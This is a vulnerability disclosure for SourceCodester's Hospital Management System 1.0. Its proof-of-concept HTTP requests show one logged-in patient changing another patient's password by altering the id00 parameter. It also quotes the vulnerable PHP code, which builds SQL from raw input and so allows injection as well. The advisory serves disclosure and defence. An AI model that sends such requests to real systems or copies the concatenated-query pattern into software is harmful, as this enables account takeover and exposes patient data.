---
title: Hospital Management System 1.0 Insecure Direct Object Reference / Account Takeover
published: true
---


- Exploit Title: Hospital Management System - IDOR + Accaunt Takeover
- Google Dork: N/A
- Application: Hospital Management System
- Date: 27.02.2024
- Bugs: IDOR + Accaunt Takeover
- Exploit Author: SoSPiro
- Vendor Homepage: https://www.sourcecodester.com/
- Software Link: https://www.sourcecodester.com/php/16720/free-hospital-management-system-small-practices.html
- Version: 1.0
- Tested on: Windows 10 64 bit Wampserver
- CVE : N/A


### Vulnerability Description:

This report focuses on two vulnerabilities known as "Insecure Direct Object References (IDOR)" and "Account Takeover". These vulnerabilities occur in a scenario where user input and access privileges validation is inadequate.


### Proof of Concept (PoC):

**Target User Information:**

```
---------------------------------
User 1:
ID: 1
Email: patient@patient.com
Password: patient
---------------------------------
User 2:
ID: 4
Email: attack@ker
Password: q1w2e3
---------------------------------
```

- User 1 Request

```
POST /Vaidya%20Mitra/vm/patient/edit-user.php HTTP/1.1
Host: localhost
Cookie: _ga=GA1.1.2080672900.1708952048; _gid=GA1.1.1833914840.1708952048; PHPSESSID=f6je8gcsm0h685mfr2g37ot8to
...
id00=1&oldemail=patient%40patient.com&email=patient%40patient.com&name=Mrs.Sunita+Dighe&nic=422201&Tele=9090909091&address=India&password=patient&cpassword=patient
```

- User 2 Request

```
POST /Vaidya%20Mitra/vm/patient/edit-user.php HTTP/1.1
Host: localhost
Cookie: PHPSESSID=4c8per12a8freilu1upich92a4
...
id00=4&oldemail=attack%40ker&email=attack%40ker&name=attack+attacker&nic=123123123&Tele=0712345677&address=attac&password=q1w2e3&cpassword=q1w2e3
```


- Attacker's Request

The attacker aims to modify the account details of "patient 1" and sends the following HTTP request:

```
POST /Vaidya%20Mitra/vm/patient/edit-user.php HTTP/1.1
Host: localhost
Cookie: PHPSESSID=4c8per12a8freilu1upich92a4
...
id00=1&oldemail=patient%40patient.com&email=patient%40patient.com&name=MRRS.Sunita+Dighe&nic=422201&Tele=9090909091&address=attac&password=q1w2e3&cpassword=q1w2e3
```

In the above SQL queries, the $id value received from the user is directly included in the query and security
checks are not performed. This allows exploiting another user's information. At the same time, since
the user's identity is obtained from the POST data, the attacker can pass his identity as another user's identity.

[Poc viode](https://www.youtube.com/watch?v=pmoBSnu9IYI)


### Vulnerable code section:

```php
$sql1="update patient set pemail='$email',pname='$name',ppassword='$password',pnic='$nic',ptel='$tele',paddress='$address' where pid=$id ;";
$database->query($sql1);
echo $sql1;
$sql1="update webuser set email='$email' where email='$oldemail' ;";
$database->query($sql1);
echo $sql1;
```


### **Risks This security vulnerability exposes user information to unauthorized access and modifications. Consequently, there are potential risks such as account takeover, privacy breaches, and non-compliance with security policies, which can lead to substantial damage and security breaches in the system.**